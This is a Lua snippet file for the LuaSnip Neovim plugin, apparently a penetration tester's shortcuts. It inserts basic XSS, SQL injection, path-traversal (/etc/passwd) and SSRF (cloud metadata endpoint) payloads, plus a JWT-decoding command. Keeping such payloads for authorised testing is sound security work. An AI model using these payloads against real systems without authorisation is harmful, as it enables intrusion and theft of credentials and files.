local ls = require("luasnip")
local s = ls.snippet
local t = ls.text_node
local i = ls.insert_node

return {
  -- XSS payloads
  s("xss1", {
    t("<script>alert(1)</script>"),
  }),

  s("xss2", {
    t("'><script>alert(1)</script>"),
  }),

  s("xss3", {
    t('"<script>alert(1)</script>'),
  }),

  s("xssimg", {
    t('<img src=x onerror=alert(1)>'),
  }),

  -- SQLi
  s("sql1", {
    t("' OR 1=1--"),
  }),

  s("sql2", {
    t("' OR '1'='1"),
  }),

  s("sql3", {
    t("admin'--"),
  }),

  -- LFI
  s("lfi", {
    t("../../../etc/passwd"),
  }),

  s("lfi2", {
    t("....//....//....//etc/passwd"),
  }),

  -- SSRF
  s("ssrf1", {
    t("http://169.254.169.254/latest/meta-data/"),
  }),

  s("ssrf2", {
    t("http://localhost:80"),
  }),

  -- JWT debug
  s("jwt", {
    t({"# Decode JWT:", ""}),
    t("echo '"),
    i(1, "JWT_TOKEN"),
    t("' | cut -d. -f2 | base64 -d | jq"),
  }),
}
